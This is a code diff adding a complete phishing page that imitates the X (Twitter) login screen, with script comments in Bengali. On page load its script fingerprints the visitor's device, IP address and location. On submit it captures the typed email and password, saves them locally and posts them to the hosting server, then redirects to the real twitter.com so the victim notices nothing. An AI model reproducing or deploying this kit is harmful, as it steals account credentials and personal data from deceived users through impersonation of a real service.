@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X - Log in</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+        }
+        
+        /* Left Side - Hero Section */
+        .hero-section {
+            flex: 1;
+            background-color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid #2F3336;
+        }
+        
+        .hero-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 50%, #1DA1F2 0%, transparent 60%);
+            opacity: 0.05;
+            animation: pulse 8s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.05; transform: scale(1); }
+            50% { opacity: 0.08; transform: scale(1.02); }
+        }
+        
+        .twitter-logo-large {
+            width: 380px;
+            height: 380px;
+            fill: #fff;
+            opacity: 0.9;
+            filter: drop-shadow(0 0 20px rgba(29, 161, 242, 0.3));
+        }
+        
+        /* Right Side - Login Section */
+        .login-section {
+            width: 45%;
+            max-width: 600px;
+            padding: 80px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .twitter-logo {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+            margin-bottom: 40px;
+        }
+        
+        .login-subtitle {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: #E7E9EA;
+        }
+        
+        .social-button {
+            display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 16px;
+            border-radius: 9999px; border: 1px solid #536471; background: transparent; color: #fff;
+            font-size: 15px; font-weight: 500; cursor: pointer; transition: all 0.2s ease;
+            position: relative; overflow: hidden;
+        }
+        
+        .social-button:hover { background: rgba(255, 255, 255, 0.03); border-color: #71767B; transform: translateY(-1px); }
+        .social-icon { width: 18px; height: 18px; }
+        
+        .divider { display: flex; align-items: center; max-width: 300px; margin: 20px 0; }
+        .divider-line { flex: 1; height: 1px; background: #2F3336; }
+        
+        .login-form { max-width: 300px; }
+        .input-group { margin-bottom: 20px; position: relative; }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%; height: 56px; border: 1px solid #2F3336; border-radius: 4px; padding: 0 16px;
+            font-size: 17px; background-color: #000; color: #fff; transition: all 0.3s ease; outline: none;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1DA1F2;
+            box-shadow: 0 0 0 2px rgba(29, 161, 242, 0.2);
+        }
+        
+        ::placeholder { color: #71767B; }
+        
+        .login-button {
+            background: #fff; color: #000; border: none; border-radius: 9999px; padding: 14px 0;
+            font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; margin-bottom: 20px;
+            transition: all 0.2s ease; position: relative; overflow: hidden;
+        }
+        
+        .login-button:hover { background: #E6E6E6; transform: translateY(-1px); }
+        .login-button:disabled { background: #a6a6a6; cursor: wait; transform: none; }
+        
+        .footer-links { max-width: 300px; text-align: center; }
+        .footer-links a { color: #1DA1F2; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .footer-links a:hover { text-decoration: underline; }
+        
+        .signup-section { max-width: 300px; margin-top: 40px; }
+        .signup-title { font-size: 17px; font-weight: 600; color: #71767B; margin-bottom: 20px; }
+        
+        .signup-button {
+            background: transparent; color: #1DA1F2; border: 1px solid #536471; border-radius: 9999px; padding: 12px 0;
+            font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.2s ease;
+        }
+        
+        .signup-button:hover { background: rgba(29, 161, 242, 0.1); }
+        
+        .terms { margin-top: 60px; max-width: 300px; font-size: 11px; color: #71767B; line-height: 1.5; }
+        .terms a { color: #1DA1F2; text-decoration: none; }
+        .terms a:hover { text-decoration: underline; }
+        
+        @media (max-width: 1200px) {
+            .hero-section { display: none; }
+            .login-section { width: 100%; max-width: 100%; align-items: center; text-align: center; }
+        }
+        @media (max-width: 768px) {
+            .login-section { padding: 40px 20px; }
+            .login-subtitle { font-size: 23px; }
+            .twitter-logo { margin-bottom: 24px; }
+        }
+        @media (max-width: 480px) {
+            .login-section { padding: 20px; }
+            .login-subtitle { font-size: 20px; margin-bottom: 24px; }
+            input[type="text"], input[type="password"] { height: 48px; font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="hero-section">
+        <div class="hero-background"></div>
+        <svg class="twitter-logo-large" viewBox="0 0 24 24">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+    </div>
+    
+    <div class="login-section">
+        <svg class="twitter-logo" viewBox="0 0 24 24">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+        
+        <h2 class="login-subtitle">Sign in to X</h2>
+        
+        <div class="button-group">
+             <button class="social-button"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" class="social-icon"> Sign in with Google</button>
+             <button class="social-button"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="social-icon"> Sign in with Apple</button>
+        </div>
+        
+        <div class="divider">
+            <div class="divider-line"></div>
+            <span style="padding: 0 16px;">or</span>
+            <div class="divider-line"></div>
+        </div>
+        
+        <div class="login-form">
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" name="email" id="phone_email" placeholder="Phone, email, or username" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" name="pass" id="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="login-button" id="loginButton">Log in</button>
+            </form>
+            
+            <div class="footer-links">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-section">
+            <div class="signup-title">Don't have an account?</div>
+            <button class="signup-button">Sign up</button>
+        </div>
+        
+        <div class="terms">
+            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+        </div>
+    </div>
+
+    <!-- =========== ডেটা সংগ্রহের জন্য নতুন স্ক্রিপ্ট =========== -->
+    <script>
+        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
+        let deviceInfoPromise = (async () => {
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown', platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown', res: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            if (navigator.connection) deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                } catch (e) { /* ignore */ }
+            }
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+            } catch (e) { deviceInfo.ip = 'Failed to fetch'; }
+            return JSON.stringify(deviceInfo);
+        })();
+
+        // ফর্ম সাবমিট করার সময় ডেটা ম্যানেজ করা
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // ফর্মের ডিফল্ট সাবমিশন বন্ধ করা
+
+            const email = document.getElementById('phone_email').value;
+            const pass = document.getElementById('password').value;
+
+            if (!email || !pass) {
+                alert('Please enter your credentials.');
+                return;
+            }
+
+            const loginButton = document.getElementById('loginButton');
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+            
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ ডেটা সেভ করা
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.twitterData) {
+                    storedData.twitterData = [];
+                }
+                storedData.twitterData.push({
+                    email: email,
+                    pass: pass,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: 'login'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) {
+                console.error('Error saving to localStorage:', error);
+            }
+
+            // সার্ভারে ডেটা পাঠানোর সিমুলেশন
+            try {
+                await fetch('/', { 
+                    method: 'POST', 
+                    body: new URLSearchParams({ email, pass, deviceInfo }) 
+                });
+            } catch (error) {
+                console.error('Error sending data to server:', error);
+            }
+
+            // ব্যবহারকারীকে আসল X সাইটে রিডাইরেক্ট করা
+            setTimeout(() => {
+                window.location.href = 'https://twitter.com/home';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
